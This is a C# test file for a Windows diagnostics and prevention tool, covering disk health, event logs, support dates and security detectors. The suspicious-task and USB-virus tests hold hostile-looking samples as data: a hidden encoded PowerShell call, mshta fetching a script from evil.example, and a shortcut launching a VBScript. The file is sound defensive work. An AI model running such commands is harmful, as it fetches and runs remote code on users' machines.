using System.Buffers.Binary;
using System.Text;
using System.Text.Json;
using System.Xml.Linq;
using SoluPulse.Core.Corrections;
using SoluPulse.Platform.Windows.Actions;
using SoluPulse.Platform.Windows.Collectors;
using SoluPulse.Platform.Windows.Interop;

namespace SoluPulse.Platform.Windows.Tests;

public sealed class PreventionTests : IDisposable
{
    private readonly string _folder = Path.Combine(Path.GetTempPath(), "solupulse-prevention-" + Guid.NewGuid().ToString("N"));

    public PreventionTests() => Directory.CreateDirectory(_folder);

    public void Dispose() => Directory.Delete(_folder, recursive: true);

    // --- Disques -------------------------------------------------------------------------------

    [Fact]
    public void ParsesTheNvmeHealthLog()
    {
        var log = new byte[512];
        log[0] = 0x04;
        BinaryPrimitives.WriteUInt16LittleEndian(log.AsSpan(1), 309);
        log[3] = 87;
        log[4] = 10;
        log[5] = 12;
        BinaryPrimitives.WriteUInt64LittleEndian(log.AsSpan(128), 3409);
        BinaryPrimitives.WriteUInt64LittleEndian(log.AsSpan(144), 544);
        BinaryPrimitives.WriteUInt64LittleEndian(log.AsSpan(160), 735);

        var health = NvmeHealth.Parse(log)!;

        Assert.Equal(4, health.CriticalWarning);
        Assert.Equal(36, health.TemperatureCelsius);
        Assert.Equal(87, health.AvailableSparePercent);
        Assert.Equal(12, health.PercentageUsed);
        Assert.Equal(3409ul, health.PowerOnHours);
        Assert.Equal(544ul, health.UnsafeShutdowns);
        Assert.Equal(735ul, health.MediaErrors);
        Assert.Null(NvmeHealth.Parse(new byte[100]));
    }

    [Theory]
    [InlineData("Samsung SSD 980 PRO 1TB", "3B2QGXA7", true)]
    [InlineData("Samsung SSD 980 PRO 1TB", "5B2QGXA7", false)]
    [InlineData("Samsung SSD 990 PRO 2TB", "0B2QJXD7", true)]
    [InlineData("HP VO0960JFDGU", "HPD7", true)]
    [InlineData("HP VO0960JFDGU", "HPD8", false)]
    [InlineData("WDC PC SN520 SDAPNUW-512G-1014", "20110000", false)]
    public void RecognisesDangerousDiskFirmware(string disk, string firmware, bool risky) =>
        Assert.Equal(risky, RiskyFirmware.Find(disk, firmware) is not null);

    // --- Événements ----------------------------------------------------------------------------

    [Fact]
    public void MergesEventsOfTheSameShutdown()
    {
        var t = new DateTime(2026, 11, 1, 8, 0, 0, DateTimeKind.Utc);

        Assert.Equal(2, EventLogCollector.DistinctIncidents([t, t.AddMinutes(1), t.AddHours(5)], TimeSpan.FromMinutes(10)));
        Assert.Equal(0, EventLogCollector.DistinctIncidents([], TimeSpan.FromMinutes(10)));
    }

    [Theory]
    [InlineData("2026-11-11T08:13:07Z", "2026-11-10T19:04:33Z", 2, false)]
    [InlineData("2026-11-11T08:13:07Z", "2015-01-01T00:00:00Z", 1, true)]
    [InlineData("2026-11-11T08:13:07Z", "2026-11-11T08:13:06Z", 1, false)]
    public void OnlyLargeNonResumeClockCorrectionsCount(string newTime, string oldTime, int reason, bool counts)
    {
        var xml = XDocument.Parse($"""<Event><EventData><Data Name="NewTime">{newTime}</Data><Data Name="OldTime">{oldTime}</Data><Data Name="Reason">{reason}</Data></EventData></Event>""");

        Assert.Equal(counts, EventLogCollector.IsLargeCorrection(EventLogCollector.ClockJump(xml)));
    }

    [Fact]
    public void ReadsBugCheckCodesAndFamilies()
    {
        var xml = XDocument.Parse("""<Event><EventData><Data Name="param1">0x0000001a (0x0000000000041792, 0xffff)</Data></EventData></Event>""");

        Assert.Equal(0x1Au, BugCheck.ParseCode(xml));
        Assert.Equal(BugCheckFamily.Memoire, BugCheck.FamilyOf(0x1A));
        Assert.Equal(BugCheckFamily.Materiel, BugCheck.FamilyOf(0x124));
        Assert.Equal(BugCheckFamily.Graphique, BugCheck.FamilyOf(0x116));
        Assert.Equal(BugCheckFamily.Autre, BugCheck.FamilyOf(0xDEAD));
        Assert.Null(BugCheck.ParseCode(XDocument.Parse("<Event/>")));
    }

    // --- Électricité ---------------------------------------------------------------------------

    [Theory]
    [InlineData("+12V", 12.7, "rail_12v", 5.8)]
    [InlineData("+5V", 5.02, "rail_5v", 0.4)]
    [InlineData("3VCC", 3.3, "rail_3v3", 0)]
    public void MeasuresPowerRailDeviation(string sensor, double value, string metric, double deviation)
    {
        var rail = PowerRail.Deviation(sensor, value)!;

        Assert.Equal(metric, rail.Metric);
        Assert.Equal(deviation, rail.DeviationPercent, 1);
    }

    [Theory]
    [InlineData("+12V", 1.5)]
    [InlineData("CPU VCore", 1.2)]
    [InlineData("3VSB", 3.3)]
    [InlineData("VBAT", 3.1)]
    public void IgnoresUnscaledOrUnrelatedVoltages(string sensor, double value) => Assert.Null(PowerRail.Deviation(sensor, value));

    [Fact]
    public void ClassifiesTheChassis()
    {
        Assert.True(Chassis.Classify([10]));
        Assert.False(Chassis.Classify([3]));
        Assert.Null(Chassis.Classify([2]));
    }

    // --- Fins de support -----------------------------------------------------------------------

    [Theory]
    [InlineData(26100, "Professional", false, "2026-10-13")]
    [InlineData(26100, "Enterprise", false, "2027-10-12")]
    [InlineData(26200, "Core", false, "2027-10-12")]
    [InlineData(19045, "Professional", false, "2025-10-14")]
    [InlineData(19045, "Professional", true, "2027-10-12")]
    [InlineData(19044, "EnterpriseS", false, "2027-01-12")]
    [InlineData(17763, "EnterpriseS", false, "2029-01-09")]
    public void KnowsTheEndOfSupportDates(int build, string edition, bool esu, string expected) =>
        Assert.Equal(DateOnly.Parse(expected, System.Globalization.CultureInfo.InvariantCulture), SupportCalendar.EndOfSupport(build, edition, esu));

    [Fact]
    public void UnknownNewerBuildsHaveNoEndDate() => Assert.Null(SupportCalendar.EndOfSupport(26300, "Professional", false));

    [Theory]
    [InlineData("13th Gen Intel(R) Core(TM) i9-13900K", true)]
    [InlineData("14th Gen Intel(R) Core(TM) i7-14700F", true)]
    [InlineData("13th Gen Intel(R) Core(TM) i5-13600KF", true)]
    [InlineData("13th Gen Intel(R) Core(TM) i7-13700T", false)]
    [InlineData("13th Gen Intel(R) Core(TM) i7-13700H", false)]
    [InlineData("13th Gen Intel(R) Core(TM) i5-13400", false)]
    [InlineData("Intel(R) Core(TM) i7-9850H CPU @ 2.60GHz", false)]
    public void RecognisesTheUnstableIntelProcessors(string name, bool affected) =>
        Assert.Equal(affected, SupportCalendar.IsUnstableIntelGeneration(name));

    [Fact]
    public void SummarisesWindowsUpdateHistoryWithoutDefenderUpdates()
    {
        var now = new DateTime(2026, 11, 11, 0, 0, 0, DateTimeKind.Utc);
        var history = new[]
        {
            new UpdateHistory.Entry("Mise à jour des renseignements de sécurité pour Microsoft Defender (KB2267602)", now.AddDays(-1), 2, 1, 0),
            new UpdateHistory.Entry("2026-09 Mise à jour cumulative (KB5099999)", now.AddDays(-70), 2, 1, 0),
            new UpdateHistory.Entry("2026-11 Mise à jour cumulative (KB5100001)", now.AddDays(-3), 4, 1, unchecked((int)0x80073712)),
            new UpdateHistory.Entry("2026-11 Mise à jour cumulative (KB5100001)", now.AddDays(-2), 4, 1, unchecked((int)0x80073712)),
            new UpdateHistory.Entry("Mise à jour de la sélection disjointe pour Microsoft Defender Antivirus – 2267602 Ko (version 1.463.243.0)", now.AddHours(-3), 2, 1, 0),
            new UpdateHistory.Entry("9WZDNCRFJBMP-MICROSOFT.WINDOWSSTORE", now.AddDays(-1), 4, 1, unchecked((int)0x80240034)),
            new UpdateHistory.Entry("9PLM9XGG6VKS-OpenAI.Codex", now.AddHours(-2), 2, 1, 0),
            new UpdateHistory.Entry("Intel Ports Driver Update (2543.9.0.0)", now.AddHours(-1), 2, 1, 0),
            new UpdateHistory.Entry("Realtek Semiconductor Corp. - Extension - 10.0.26100.1", now.AddHours(-1), 2, 1, 0),
        };

        var summary = UpdateHistory.Summarize(history, now);

        Assert.Equal(now.AddDays(-70), summary.LastSuccess);
        Assert.Equal(2, summary.Failures);
        Assert.Single(summary.FailedTitles);
    }

    [Fact]
    public void ReadsTheRecoveryEnvironmentState()
    {
        Assert.True(ResilienceCollector.RecoveryEnvironmentEnabled(XDocument.Parse("""<WindowsRE><InstallState state="1"/></WindowsRE>""")));
        Assert.False(ResilienceCollector.RecoveryEnvironmentEnabled(XDocument.Parse("""<WindowsRE><InstallState state="0"/></WindowsRE>""")));
        Assert.Null(ResilienceCollector.RecoveryEnvironmentEnabled(XDocument.Parse("<WindowsRE/>")));
    }

    // --- Sécurité ------------------------------------------------------------------------------

    [Fact]
    public void FlagsBroadDefenderExclusions()
    {
        var found = DefenderExclusions.Dangerous(
            [@"C:\", @"C:\Users\Awa", @"C:\Users\Awa\source\repos", @"D:\Jeux\Steam"],
            [".exe", "log"],
            ["powershell.exe", @"C:\Program Files\App\app.exe"]);

        Assert.Equal(4, found.Count);
        Assert.Contains(@"Dossier : C:\", found);
        Assert.Contains(@"Dossier : C:\Users\Awa", found);
        Assert.Contains("Extension : .exe", found);
        Assert.Contains("Programme : powershell.exe", found);
    }

    [Fact]
    public void FlagsHostsEntriesForWatchedSites()
    {
        var found = HostsFile.Suspicious(
        [
            "# 127.0.0.1 www.google.com",
            "127.0.0.1 localhost",
            "0.0.0.0 ads.example.net",
            "185.1.2.3 www.facebook.com",
            "127.0.0.1 www.kaspersky.com update.eset.com",
        ]);

        Assert.Equal(["185.1.2.3 www.facebook.com", "127.0.0.1 www.kaspersky.com", "127.0.0.1 update.eset.com"], found);
    }

    [Fact]
    public void KnownAndLocalDnsServersAreNotSuspicious() =>
        Assert.Equal(["45.9.8.7"], DnsServers.Unknown(["8.8.8.8", "192.168.1.1", "1.1.1.1", "45.9.8.7", "fe80::1", "45.9.8.7"]));

    [Theory]
    [InlineData("open", "none", "auto", "Café")]
    [InlineData("open", "none", "manual", null)]
    [InlineData("WPA2PSK", "AES", "auto", null)]
    public void FindsOpenAutoConnectWifiProfiles(string authentication, string encryption, string mode, string? expected)
    {
        var xml = XDocument.Parse($"""
            <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
              <name>Café</name><connectionMode>{mode}</connectionMode>
              <MSM><security><authEncryption><authentication>{authentication}</authentication><encryption>{encryption}</encryption></authEncryption></security></MSM>
            </WLANProfile>
            """);

        Assert.Equal(expected, WifiProfile.OpenNetworkName(xml));
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-w hidden -enc SQBFAFgA", true)]
    [InlineData("mshta.exe", "https://evil.example/a.hta", true)]
    [InlineData(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"-File C:\Program Files\Outil\maintenance.ps1", false)]
    [InlineData(@"C:\Program Files\Outil\outil.exe", "/silent", false)]
    public void RecognisesSuspiciousScheduledTasks(string command, string arguments, bool suspicious) =>
        Assert.Equal(suspicious, ScheduledTasks.IsSuspicious(command, arguments));

    [Fact]
    public void FindsVulnerableVersionsOfCommonSoftware()
    {
        var found = VulnerableSoftware.Find(
        [
            new("WinRAR 7.01 (64-bit)", "7.01.0", "win.rar GmbH"),
            new("WinRAR 7.13 (64-bit)", "7.13.0", "win.rar GmbH"),
            new("7-Zip 24.09 (x64)", "24.09", "Igor Pavlov"),
            new("VLC media player", "3.0.21", "VideoLAN"),
        ]);

        Assert.Equal(2, found.Count);
        Assert.Contains(found, f => f.StartsWith("WinRAR 7.01", StringComparison.Ordinal));
        Assert.Contains(found, f => f.StartsWith("7-Zip", StringComparison.Ordinal));
        Assert.Equal(new Version(24, 9), VulnerableSoftware.Parse("24.09"));
        Assert.Null(VulnerableSoftware.Parse("bêta"));
    }

    [Fact]
    public void ReadsBrowserNotificationsAndExtensions()
    {
        var preferences = JsonDocument.Parse("""
            {"profile":{"content_settings":{"exceptions":{"notifications":{
              "https://news.example:443,*":{"setting":1},
              "https://blocked.example:443,*":{"setting":2}}}}},
             "extensions":{"settings":{
               "aaa":{"location":1,"from_webstore":true,"manifest":{"name":"Traducteur"}},
               "bbb":{"location":4,"manifest":{"name":"Outil local"}},
               "ccc":{"location":3,"from_webstore":false,"manifest":{"name":"Barre de recherche"}},
               "ddd":{"location":5,"manifest":{"name":"Composant"}}}}}
            """);
        var copy = JsonDocument.Parse(preferences.RootElement.GetRawText());

        Assert.Equal(["https://news.example:443"], Browsers.NotificationSites(preferences));
        Assert.Equal(["Outil local", "Barre de recherche"], Browsers.SuspiciousExtensions(copy));
        Assert.Empty(Browsers.NotificationSites(null));
    }

    [Fact]
    public void ReadsTheConsoleSessionState()
    {
        var now = new DateTime(2026, 11, 11, 15, 0, 0, DateTimeKind.Utc);
        byte[] Session(int state, int flags)
        {
            var data = new byte[208];
            BinaryPrimitives.WriteInt32LittleEndian(data.AsSpan(12), state);
            BinaryPrimitives.WriteInt32LittleEndian(data.AsSpan(16), flags);
            BinaryPrimitives.WriteInt64LittleEndian(data.AsSpan(200), now.ToFileTimeUtc());
            return data;
        }

        Assert.False(ConsoleSession.Interpret(Session(0, 1), now));
        Assert.True(ConsoleSession.Interpret(Session(0, 0), now));
        Assert.True(ConsoleSession.Interpret(Session(4, 1), now));
        Assert.Null(ConsoleSession.Interpret(new byte[208], now));
    }

    [Fact]
    public void DetectsAProcessThatKeepsGrowing()
    {
        var start = DateTimeOffset.UtcNow;
        const long gb = 1L << 30;
        var leaking = Enumerable.Range(0, 13).Select(i => (start.AddMinutes(5.0 * i), gb + (i * gb / 6))).ToList();
        var stable = Enumerable.Range(0, 13).Select(i => (start.AddMinutes(5.0 * i), 2 * gb)).ToList();
        var sawtooth = leaking.Select((s, i) => i == 6 ? (s.Item1, gb / 2) : s).ToList();

        Assert.Equal(2, ProcessActivityCollector.LeakRate(leaking));
        Assert.Null(ProcessActivityCollector.LeakRate(stable));
        Assert.Null(ProcessActivityCollector.LeakRate(sawtooth));
    }

    [Fact]
    public void FindsTheShortcutVirusOnAUsbDrive()
    {
        var hidden = Directory.CreateDirectory(Path.Combine(_folder, "Cours"));
        hidden.Attributes |= FileAttributes.Hidden | FileAttributes.System;
        File.WriteAllBytes(Path.Combine(_folder, "Cours.lnk"), Encoding.Unicode.GetBytes(@"C:\Windows\System32\cmd.exe /c start wscript.exe x.vbs"));
        var script = Path.Combine(_folder, "x.vbs");
        File.WriteAllText(script, "WScript.Echo 1");
        File.SetAttributes(script, FileAttributes.Hidden);
        File.WriteAllText(Path.Combine(_folder, "notes.txt"), "rien");

        var threats = UsbThreats.Scan(_folder);

        Assert.Contains(threats, t => t.Kind == UsbThreatKind.Raccourci && t.Path.EndsWith("Cours.lnk", StringComparison.Ordinal));
        Assert.Contains(threats, t => t.Kind == UsbThreatKind.Script);
        Assert.Contains(threats, t => t.Kind == UsbThreatKind.DossierCache);
        Assert.DoesNotContain(threats, t => t.Path.EndsWith("notes.txt", StringComparison.Ordinal));
        hidden.Attributes = FileAttributes.Directory;
    }

    [Fact]
    public void AHiddenFolderAloneIsNotAThreat()
    {
        var hidden = Directory.CreateDirectory(Path.Combine(_folder, "Prive"));
        hidden.Attributes |= FileAttributes.Hidden;

        Assert.Empty(UsbThreats.Scan(_folder));
        hidden.Attributes = FileAttributes.Directory;
    }

    [Fact]
    public void RecognisesRansomwareBehaviour()
    {
        var t = DateTimeOffset.UtcNow;
        var burst = Enumerable.Range(0, 60).Select(i => t.AddSeconds(i * 0.5)).Append(t.AddMinutes(10)).ToList();

        Assert.Equal(60, RansomwareCollector.MaxInWindow(burst, TimeSpan.FromMinutes(1)));
        Assert.True(RansomwareCollector.IsEncryptionRename(@"C:\Users\A\Documents\rapport.docx", @"C:\Users\A\Documents\rapport.docx.lockbit"));
        Assert.False(RansomwareCollector.IsEncryptionRename(@"C:\Users\A\Documents\rapport.docx", @"C:\Users\A\Documents\rapport final.docx"));
        Assert.False(RansomwareCollector.IsEncryptionRename(@"C:\Users\A\Downloads\film.mp4.crdownload", @"C:\Users\A\Downloads\film.mp4"));
        Assert.False(RansomwareCollector.IsEncryptionRename(@"C:\Users\A\OneDrive\budget.849C9593-D756-4E56-8D6E-42412F2A707B", @"C:\Users\A\OneDrive\budget.xlsx"));
        Assert.False(RansomwareCollector.IsEncryptionRename(@"C:\Users\A\Documents\projet\.git\refs\heads\main.lock", @"C:\Users\A\Documents\projet\.git\refs\heads\main"));
        Assert.False(RansomwareCollector.IsEncryptionRename(@"C:\Users\A\Pictures\photo.png", @"C:\Users\A\Pictures\photo.jpg"));
        Assert.True(RansomwareCollector.IsEncryptionRename(@"C:\Users\A\Pictures\photo.jpg", @"C:\Users\A\Pictures\photo.jpg.encrypted"));
        Assert.True(RansomwareCollector.IsRansomNote(@"C:\Users\A\Documents\HOW_TO_DECRYPT_FILES.txt"));
        Assert.False(RansomwareCollector.IsRansomNote(@"C:\Users\A\Documents\liste des courses.txt"));
    }

    [Theory]
    [InlineData("\"C:\\Program Files\\App\\app.exe\" --tray", @"C:\Program Files\App\app.exe")]
    [InlineData(@"C:\Users\A\AppData\Roaming\x\run.exe -silent", @"C:\Users\A\AppData\Roaming\x\run.exe")]
    public void ExtractsTheProgramOfACommandLine(string command, string expected) => Assert.Equal(expected, ProgramPaths.Executable(command));

    [Fact]
    public void UserWritableFoldersAreRecognised()
    {
        Assert.True(ProgramPaths.IsUserWritable(@"C:\Users\A\AppData\Roaming\x\run.exe"));
        Assert.False(ProgramPaths.IsUserWritable(@"C:\Program Files\App\app.exe"));
        Assert.False(ProgramPaths.IsUserWritable(@"C:\Users\A\AppData\Local\Microsoft\WindowsApps\MSTeams_8wekyb3d8bbwe\ms-teams.exe"));
    }

    // --- Actions -------------------------------------------------------------------------------

    [Fact]
    public async Task UsbCleanupOnlyAcceptsAnInfectedRemovableDrive()
    {
        var action = new CleanUsbDriveAction();
        var context = new ActionContext(new Dictionary<string, string> { [CleanUsbDriveAction.DriveParameter] = @"C:\" }, new CallerIdentity("S-1-5-21-1", "test"));

        await Assert.ThrowsAsync<ActionParameterException>(() => action.ValidateAsync(context, default));
    }

    [Fact]
    public void PreventionActionsAreReversible()
    {
        foreach (var action in new ISystemAction[] { new EnableRecoveryEnvironmentAction(), new DisableRemoteDesktopAction(), new CleanUsbDriveAction() })
        {
            Assert.True(action.Descriptor.Reversible, action.Descriptor.Id);
            Assert.Equal(RiskLevel.Faible, action.Descriptor.Risk);
        }
    }
}
